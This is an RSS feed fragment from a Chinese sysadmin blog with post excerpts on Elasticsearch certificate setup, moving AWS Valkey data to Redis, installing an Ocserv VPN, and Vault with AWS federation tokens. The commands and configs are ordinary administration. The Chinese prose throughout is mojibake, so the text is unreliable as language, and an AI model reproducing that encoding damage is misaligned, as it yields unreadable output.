&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;       - localhost
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;     ip:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;       - 127.0.0.1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;   - name: kibana
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;     dns:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;       - kibana
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;       - localhost
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;     ip:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;       - 127.0.0.1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ç­¾å‘2ä¸ªpodçš„è¯ä¹¦&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./bin/elasticsearch-certutil cert --ca-cert ca/ca.crt --ca-key ca/ca.key --pem --in instances.yml
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å¾—åˆ°2å¼ è¯ä¹¦å’Œkey&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;unzip certificate-bundle.zip
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ç”Ÿæˆä¸¤ä¸ªç›®å½•ï¼Œes01å’Œkibana&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å‡†å¤‡å¥½è¯ä¹¦ç›®å½•&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir -p /data/elasticsearch/certs
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mv ca es01 kibana /data/elasticsearch/certs
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å‡†å¤‡å¥½æŒä¹…åŒ–å·&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir -p /data/elasticsearch/kibanadata
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir -p /data/elasticsearch/esdata01
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;äºŒé…ç½®docker-composeyaml&#34;&gt;äºŒã€é…ç½®docker-compose.yaml&lt;/h5&gt;
&lt;p&gt;8.18.6ç‰ˆæœ¬çš„docker-compose.yamlæ–‡ä»¶ï¼Œä½äºï¼š/data/elasticsearch/docker-compose.yaml&lt;/p&gt;</description>
    </item>
    <item>
      <title>AWSæ‰˜ç®¡çš„Valkeyæ•°æ®è½¬ç§»åˆ°ç¤¾åŒºRedis.ioå»</title>
      <link>https://rendoumi.com/posts/20250820-aws_valkey_to_redis_io/</link>
      <pubDate>Wed, 20 Aug 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250820-aws_valkey_to_redis_io/</guid>
      <description>&lt;p&gt;è¿™è¿˜çœŸæ˜¯ä¸ªå¤§æ´»ï¼Œè€—è´¹äº†æ•´æ•´ä¸€å¤©çš„æ—¶é—´ã€‚&lt;/p&gt;
&lt;p&gt;ç©¶å…¶åŸå› æ ¹æœ¬å°±æ˜¯æ— è®ºAWSæ‰˜ç®¡çš„Valkeyè¿˜æ˜¯ç¤¾åŒºçš„Redis.ioï¼Œéƒ½æ˜¯è¢«é­”æ”¹è¿‡çš„é˜‰å‰²ç‰ˆï¼ŒçœŸæ˜¯æ— è¯­ä»–å¦ˆç»™æ— è¯­å¼€é—¨ï¼Œæ— è¯­åˆ°å®¶äº†ï¼&lt;/p&gt;
&lt;p&gt;è¯´ä¸€ä¸‹è¯¦ç»†çš„è¿‡ç¨‹ï¼š&lt;/p&gt;
&lt;p&gt;æ¥åˆ°è¿™ä¸ªä»»åŠ¡ï¼Œé¦–å…ˆæƒ³åˆ°çš„æ˜¯åŒæ­¥è½¯ä»¶redis-Gunyu&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/mgtv-tech/redis-GunYu&#34;&gt;https://github.com/mgtv-tech/redis-GunYu&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ç»“æœæ˜¯å¤±è´¥ï¼ŒåŸå› å¾ˆå¥‡è‘©ï¼Œå› ä¸ºaws valkeyæ˜¯å¿…é¡»å¸¦tlsè¿æ¥çš„ï¼ŒGunyuä¸æ”¯æŒï¼Œæ”¾å¼ƒã€‚&lt;/p&gt;
&lt;p&gt;ç„¶åæ‰¾åˆ°äº†redis-shake&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://tair-opensource.github.io/RedisShake&#34;&gt;https://tair-opensource.github.io/RedisShake&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ç»“æœè¿˜æ˜¯å¤±è´¥ï¼Œç†ç”±æ˜¯ä¸æ”¯æŒPSyncï¼Œç”¨äº†scan_readerä¹Ÿå¤±è´¥&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20250820141906654&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250820-aws_valkey_to_redis_io/image-20250820141906654.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åå°±åˆæƒ³åˆ°äº†ä¸‡èƒ½çš„ChatGPTå’ŒGoogleçš„Geminiï¼Œåˆ†åˆ«ç»™äº†2ä¸ªpythonç¨‹åºï¼Œä¹Ÿæ˜¯å¤±è´¥&lt;/p&gt;
&lt;p&gt;åŸå› æ˜¯ä¸æ”¯æŒMigrateå‘½ä»¤ï¼Œè€Œä¸”valkeyæ˜¯åŸºäºredis 7.2æ”¹çš„ï¼Œè€ŒRedis.ioæ˜¯8.0ï¼Œå‘½ä»¤ä¸å…¼å®¹&lt;/p&gt;
&lt;p&gt;èµ°æŠ•æ— è·¯ä¹‹ä¸‹æƒ³åˆ°äº†rdb-toolsï¼Œå…ˆæŠŠvalkeyåšä¸ªå¤‡ä»½ï¼Œæ”¾åˆ°S3æ¡¶é‡Œ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;valeky-20250819-0001.rdb
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;valeky-20250819-0002.rdb
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;valeky-20250819-0003.rdb
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;valeky-20250819-0004.rdb
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;valeky-20250819-0005.rdb
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;valeky-20250819-config.json
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat valeky-20250819-config.json 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;valeky-20250819/valeky-20250819-0002.rdb&amp;#34;&lt;/span&gt; : &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;Slots&amp;#34;&lt;/span&gt; : &lt;span class=&#34;s2&#34;&gt;&amp;#34;0-5496&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;rdbSize&amp;#34;&lt;/span&gt; : &lt;span class=&#34;s2&#34;&gt;&amp;#34;5234516&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;valeky-20250819/valeky-20250819-0004.rdb&amp;#34;&lt;/span&gt; : &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;Slots&amp;#34;&lt;/span&gt; : &lt;span class=&#34;s2&#34;&gt;&amp;#34;5497-8375&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;rdbSize&amp;#34;&lt;/span&gt; : &lt;span class=&#34;s2&#34;&gt;&amp;#34;4340658&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;valeky-20250819/valeky-20250819-0003.rdb&amp;#34;&lt;/span&gt; : &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;Slots&amp;#34;&lt;/span&gt; : &lt;span class=&#34;s2&#34;&gt;&amp;#34;10082-16383&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;rdbSize&amp;#34;&lt;/span&gt; : &lt;span class=&#34;s2&#34;&gt;&amp;#34;5962581&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;valeky-20250819/valeky-20250819-0001.rdb&amp;#34;&lt;/span&gt; : &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;Slots&amp;#34;&lt;/span&gt; : &lt;span class=&#34;s2&#34;&gt;&amp;#34;8376&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;rdbSize&amp;#34;&lt;/span&gt; : &lt;span class=&#34;s2&#34;&gt;&amp;#34;2218&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;valeky-20250819/valeky-20250819-0005.rdb&amp;#34;&lt;/span&gt; : &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;Slots&amp;#34;&lt;/span&gt; : &lt;span class=&#34;s2&#34;&gt;&amp;#34;8377-10081&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;rdbSize&amp;#34;&lt;/span&gt; : &lt;span class=&#34;s2&#34;&gt;&amp;#34;1540505&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;çœ‹èµ·æ¥æ˜¯5ä¸ªrdbå¤‡ä»½ï¼Œæ¯ä¸ªæ–‡ä»¶å¯¹åº”redisä¸åŒçš„slots&lt;/p&gt;
&lt;p&gt;ç”¨rdbæ¥è§£æå¤‡ä»½æ–‡ä»¶ï¼Œç»“æœå¤±è´¥ï¼Œå› ä¸ºä¸è®¤è¯†valkey rdbçš„ç‰ˆæœ¬ã€‚&lt;/p&gt;
&lt;p&gt;æ²¡åŠæ³•äº†ï¼Œåˆæ‰¾åˆ°äº†è¿™ä¸ªè½¯ä»¶&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/HDT3213/rdb&#34;&gt;https://github.com/HDT3213/rdb&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä¸‹è½½åï¼Œé¦–å…ˆæƒ³å¤„ç†æˆjsonæ–‡ä»¶ï¼Œç„¶åçŒå…¥åˆ°redis.io&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./rdb-linux-amd64 -c json -o 0001.json valeky-20250819-0001.rdb
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¤±è´¥ï¼Œå› ä¸ºjsonæ–‡ä»¶çŒå…¥çš„æ—¶å€™redis.ioåˆè¢«é˜‰å‰²äº†ï¼Œå‘½ä»¤ä¸æ”¯æŒ&lt;/p&gt;</description>
    </item>
    <item>
      <title>Ocserv VPNçš„å®‰è£…å’Œä½¿ç”¨</title>
      <link>https://rendoumi.com/posts/20250819-oserv_vpn/</link>
      <pubDate>Tue, 19 Aug 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250819-oserv_vpn/</guid>
      <description>&lt;p&gt;ç”±äºiosçš„openvpnå¤§é™†åœ°åŒºæ— æ³•å®‰è£…ï¼Œè€Œå‘˜å·¥åˆéœ€è¦æ‰‹æœºæˆ–PCç™»å½•VPNè®¿é—®äº‘ä¸Šçš„èµ„æºï¼Œæ²¡åŠæ³•ï¼Œæ‰¾äº†åˆæ‰¾ï¼Œç»ˆäºï¼Œå‘ç°ciscoçš„vpnè¿˜æ˜¯èƒ½åœ¨è‹¹æœå¸‚åœºä¸‹è½½å®‰è£…çš„ï¼Œé‚£å°±è£…ä¸ªå¼€æºçš„Ocservå§ï¼Œåˆ«è¯´è¿˜æŒºå¥½ï¼Œèƒ½åˆ†ç»„æ§åˆ¶è·¯ç”±çš„å‘å¸ƒï¼Œéå¸¸ä¸é”™&lt;/p&gt;
&lt;p&gt;è®°å½•ä¸€ä¸‹å®‰è£…é…ç½®è¿‡ç¨‹ï¼Œä½¿ç”¨Ubuntu 24.04çš„åº•ç‰ˆï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt update
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt upgrade
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-cache show ocserv
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get install -y ocserv
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ocserv --version
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å®‰è£…æ­¥éª¤å°±å¦‚ä¸Šï¼Œéå¸¸ç®€å•ï¼Œè·Ÿopenvpnä¸€æ ·ï¼Œé…ç½®æ–‡ä»¶å°±ä¸€ä¸ª &lt;code&gt;/etc/ocserv/ocserv.conf&lt;/code&gt;, ç¼–è¾‘ä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# è®¤è¯æ–¹å¼ä¸ºç”¨æˆ·åå¯†ç è®¤è¯&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;auth&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;plain[passwd=/etc/ocserv/passwd]&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å¼€æ”¾ç«¯å£&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp-port &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;443&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;udp-port &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;443&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# è¯ä¹¦&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;server-cert &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; /etc/ocserv/_.rendoumi.com.crt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;server-key &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; /etc/ocserv/_.rendoumi.com.key
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æœ€å¤šç”¨æˆ·æ•°&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;max-clients &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1024&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ç»‘å®šåŸŸå&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;default-domain &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; m.rendoumi.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# åˆ†é…çš„åŠ¨æ€ipæ®µ&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ipv4-network &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 10.8.12.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ipv4-netmask &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 255.255.255.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ä¸è·¯ç”±&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;no-route &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 10.0.0.0/255.0.0.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;no-route &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 172.16.0.0/255.240.0.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;no-route &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 192.168.0.0/255.255.0.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å‘å¸ƒè·¯ç”±&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;route&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 10.8.2.15/32
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;route&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 10.10.247.234/32
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;route&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 10.10.240.37/32
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¯´æ˜ï¼šç«¯å£å¼€åœ¨äº†443ç«¯å£ï¼Œè¯ä¹¦ç”¨çš„æ˜¯acmeçš„å…è´¹è¯ä¹¦ï¼ŒåŸŸåæ˜¯m.rendoumi.comï¼Œipæ®µæ˜¯10.8.12.0/24&lt;/p&gt;</description>
    </item>
    <item>
      <title>Vaultä½¿ç”¨AWSçš„federation_tokenè¿›è¡Œäº¤äº’</title>
      <link>https://rendoumi.com/posts/20250818-vault_sts_token/</link>
      <pubDate>Mon, 18 Aug 2025 09:12:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250818-vault_sts_token/</guid>
      <description>&lt;p&gt;Vaultçš„ä½¿ç”¨ç»§ç»­æ·±å…¥ï¼Œé€šå¸¸æƒ…å†µä¸‹éƒ½æ˜¯å…ˆæ‹¿åˆ°valutçš„root tokenï¼Œç„¶åç™»å½•è®¾ç½®awsçš„è®¤è¯ï¼ŒåŒæ—¶æŠŠawsçš„iam rootå‡­æ®çŒè¿›å»ï¼Œç„¶åwriteè¿›è¡Œè®ºè½¬ï¼Œè¿™æ ·å‡­æ®å°±åªå­˜åœ¨äºvaultä¹‹ä¸­äº†ï¼Œæ²¡æœ‰æ³„éœ²çš„å¯èƒ½ã€‚ç„¶åä»è¿™ä¸ªrootå‡­æ®å†æ´¾ç”Ÿæˆå„ç§ä½¿ç”¨æ—¶é•¿æœ‰é™åˆ¶çš„ä¸´æ—¶å‡­æ®ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯ï¼Œå˜¿å˜¿ï¼Œæˆ‘ååæ²¡æœ‰rootå‡­æ®ï¼Œå› ä¸ºæˆ‘æ˜¯å¤–é¢ç®¡ç†å‘˜ã€‚åªèƒ½ç”¨ federation_token è¿›è¡Œç™»å½•ã€‚&lt;/p&gt;
&lt;p&gt;é‚£æ€ä¹ˆä½¿ç”¨å‘¢ï¼Ÿæ–¹æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;é¦–å…ˆåœ¨AWSçš„IAMå»ºç«‹ä¸¤ä¸ªpolicy&lt;/p&gt;
